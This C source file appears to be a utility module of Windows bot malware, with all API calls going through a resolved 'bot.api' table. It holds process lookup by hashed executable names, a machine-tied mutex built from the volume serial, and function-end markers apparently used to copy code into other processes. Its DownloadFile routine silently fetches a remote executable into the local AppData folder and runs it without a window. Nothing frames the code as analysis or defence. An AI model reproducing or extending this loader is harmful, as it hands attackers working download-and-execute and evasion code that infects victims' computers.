#include "utils.h"
#include <TlHelp32.h>
#include <urlmon.h>

#include "string.h"
#include "api.h"
#include "mem.h"

extern bot_t bot;

DWORD WINAPI FindProcessIDByHash(DWORD dwHash)
{
	HANDLE hSnapshot;
	PROCESSENTRY32W pe32;
	DWORD dwProcessID;

	if ((hSnapshot = bot.api.pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
		return -1;

	dwProcessID = -1;

	memzero(&pe32, sizeof(PROCESSENTRY32W));
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	if (bot.api.pProcess32FirstW(hSnapshot, &pe32))
	{
		do 
		{
			DWORD dwCurrentHash = crc32Hash(pe32.szExeFile, StrLengthW(pe32.szExeFile) * 2);

			if (dwCurrentHash == dwHash)
			{
				dwProcessID = pe32.th32ProcessID;
				break;
			}
		} 
		while (bot.api.pProcess32NextW(hSnapshot, &pe32));
	}

	bot.api.pCloseHandle(hSnapshot);

	return dwProcessID;
}
DWORD WINAPI FindProcessIDByHashEnd(void) { return 0; }

#define HASH_EXPLORER_EXE 0x095e2844

BOOL WINAPI IsOperatingSystem64Bit()
{
	LPWSTR pwzWinDir;
	wchar_t wzExplorerPath[MAX_PATH];
	BOOL bIs64 = FALSE;

	if ((pwzWinDir = GetWinDir()) == NULL)
		return FALSE;

	memzero(&wzExplorerPath, sizeof(wzExplorerPath));
	bot.api.pwsprintfW(wzExplorerPath, L"%s\\SysWOW64\\explorer.exe", pwzWinDir);

	bIs64 = FileExists(wzExplorerPath);

	memfree(pwzWinDir);

	return bIs64;
}
DWORD WINAPI IsOperatingSystem64BitEnd(void) { return 0; }

LPWSTR WINAPI GetWinDir()
{
	wchar_t wzWindowsDir[MAX_PATH];
	memzero(&wzWindowsDir, sizeof(wzWindowsDir));

	if (bot.api.pGetWindowsDirectoryW(wzWindowsDir, MAX_PATH) != 0)
	{
		return StrCopyW(wzWindowsDir, StrLengthW(wzWindowsDir) * 2);
	}

	return NULL;
}
DWORD WINAPI GetWinDirEnd(void) { return 0; }

LPWSTR WINAPI GetSystem32Dir()
{
	wchar_t wzSystemDir[MAX_PATH];
	memzero(&wzSystemDir, sizeof(wzSystemDir));

	if (bot.api.pGetSystemDirectoryW(wzSystemDir, MAX_PATH) != 0)
	{
		return StrCopyW(wzSystemDir, StrLengthW(wzSystemDir) * 2);
	}

	return NULL;
}

LPWSTR WINAPI GetFolderPath(DWORD dwCSIDL)
{
	wchar_t wzBuffer[MAX_PATH];
	memzero(&wzBuffer, sizeof(wzBuffer));
	bot.api.pSHGetFolderPathW(0, dwCSIDL, 0, 0, wzBuffer);

	if (!EndsWithSlashW(wzBuffer))
		return StrConcatW(wzBuffer, L"\\");
	else
		return StrCopyW(wzBuffer, StrLengthW(wzBuffer));
}

LPVOID WINAPI ReadFileFromDisk(const LPWSTR pwzPath, PDWORD pdwSize)
{
	HANDLE hFile;
	BOOL bSuccess;
	LPVOID lpFile;
	DWORD dwRead = 0;

	lpFile = NULL;
	bSuccess = FALSE;

	if ((hFile = bot.api.pCreateFileW(pwzPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0, OPEN_EXISTING, 0, 0)) != INVALID_HANDLE_VALUE)
	{
		DWORD dwFileLength = bot.api.pGetFileSize(hFile, NULL);

		if ((lpFile = memalloc(dwFileLength)) != NULL)
		{
			bSuccess = bot.api.pReadFile(hFile, lpFile, dwFileLength, &dwRead, 0);

			*pdwSize = dwRead;
		}

		bot.api.pCloseHandle(hFile);
	}

	return lpFile;
}

BOOL WINAPI WriteFileToDisk(LPVOID lpFile, DWORD dwLength, const LPWSTR pwzPath)
{
	HANDLE hFile;
	DWORD dwWritten;
	BOOL bSuccess = FALSE;

	if ((hFile = bot.api.pCreateFileW(pwzPath, GENERIC_ALL, FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0)) != INVALID_HANDLE_VALUE)
	{
		bSuccess = bot.api.pWriteFile(hFile, lpFile, dwLength, &dwWritten, NULL) && dwLength == dwWritten;

		bot.api.pCloseHandle(hFile);
	}

	return bSuccess;
}

DWORD WINAPI GetSerialNumber()
{
	wchar_t wzVolumeBuffer[MAX_PATH], wzFileSysName[MAX_PATH];
	DWORD dwSerialNumber, dwMaximumComponentLength, dwSysFlags;
	HANDLE hVolume;
	BOOL bResult = FALSE;

	memzero(&wzVolumeBuffer, sizeof(wzVolumeBuffer));
	memzero(&wzFileSysName, sizeof(wzFileSysName));

	if ((hVolume = bot.api.pFindFirstVolumeW(wzVolumeBuffer, MAX_PATH)) == INVALID_HANDLE_VALUE)
		return 0;

	bResult = bot.api.pGetVolumeInformationW(wzVolumeBuffer, NULL, MAX_PATH, &dwSerialNumber, &dwMaximumComponentLength, &dwSysFlags, wzFileSysName, MAX_PATH);

	bot.api.pFindVolumeClose(hVolume);

	if (bResult)
		return dwSerialNumber;

	return 0;
}

DWORD WINAPI GetRandomNumber()
{
	POINT mouse_point;
	memzero(&mouse_point, sizeof(POINT));

	if (!bot.api.pGetCursorPos(&mouse_point))
		return 0;

	ULONG lRandomData = mouse_point.x * mouse_point.y;
	
	return bot.api.pRtlRandomEx(&lRandomData);
}

BOOL WINAPI StartFileProcess(const LPWSTR pwzPath)
{
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	memzero(&si, sizeof(STARTUPINFOW));
	memzero(&pi, sizeof(PROCESS_INFORMATION));

	if (bot.api.pCreateProcessW(pwzPath, pwzPath, 0, 0, FALSE, CREATE_NO_WINDOW, 0, 0, &si, &pi))
	{
		bot.api.pCloseHandle(pi.hProcess);
		bot.api.pCloseHandle(pi.hThread);

		return TRUE;
	}

	return FALSE;
}

BOOL WINAPI DownloadFile(const LPSTR pszURL, BOOL bExecute)
{
	LPWSTR pwzTempPath;
	BOOL bSuccess = FALSE;

	wchar_t wzDownloadPath[255], wzURL[255];
	if ((pwzTempPath = GetFolderPath(CSIDL_LOCAL_APPDATA)) == NULL)
		return FALSE;

	memzero(&wzDownloadPath, sizeof(wzDownloadPath));
	bot.api.pwsprintfW(wzDownloadPath, L"%s%d.exe", pwzTempPath, GetRandomNumber());

	memzero(&wzURL, sizeof(wzURL));
	bot.api.pMultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, pszURL, StrLengthA(pszURL), &wzURL, 255);

	if (bot.api.pURLDownloadToFileW(0, wzURL, wzDownloadPath, 0, 0) == S_OK)
	{
		if (bExecute)
		{
			bSuccess = StartFileProcess(wzDownloadPath);
		}
	}

	return bSuccess;
}

BOOL WINAPI FileExists(const LPWSTR pwzPath)
{
	HANDLE hFile;

	if ((hFile = bot.api.pCreateFileW(pwzPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE)
		return FALSE;
	
	bot.api.pCloseHandle(hFile);

	return TRUE;
}

HANDLE WINAPI CreateMutexOfProcess(DWORD dwProcessID)
{
	HANDLE hMutex;
	wchar_t wzMutex[255];

	memzero(&wzMutex, sizeof(wzMutex));
	bot.api.pwsprintfW(wzMutex, L"%x%x", GetSerialNumber(), dwProcessID);

	if ((hMutex = bot.api.pOpenMutexW(SYNCHRONIZE, FALSE, wzMutex)) == 0)
	{
		return bot.api.pCreateMutexW(0, FALSE, wzMutex);
	}

	bot.api.pCloseHandle(hMutex);

	return 0;
}

DWORD WINAPI GetCountOfThreadsByProcessId(DWORD dwProcessID)
{
	HANDLE hSnapshot;
	DWORD dwThreadCount;

	if ((hSnapshot = bot.api.pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)) == INVALID_HANDLE_VALUE)
		return -1;

	dwThreadCount = 0;

	THREADENTRY32 te32;
	memzero(&te32, sizeof(THREADENTRY32));
	te32.dwSize = sizeof(THREADENTRY32);

	if (bot.api.pThread32First(hSnapshot, &te32))
	{
		do
		{
			if (te32.th32OwnerProcessID == dwProcessID)
				dwThreadCount++;

		} while (bot.api.pThread32Next(hSnapshot, &te32));
	}

	bot.api.pCloseHandle(hSnapshot);

	return dwThreadCount;
}

DWORD WINAPI GetProcessIdByHandle(HANDLE hProcess)
{
	DWORD dwPbiSize = 0;
	PROCESS_BASIC_INFORMATION pbi;
	memzero(&pbi, sizeof(PROCESS_BASIC_INFORMATION));

	if (bot.api.pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &dwPbiSize) >= 0 && pbi.PebBaseAddress != 0)
	{
		return pbi.UniqueProcessId;
	}

	return -1;
}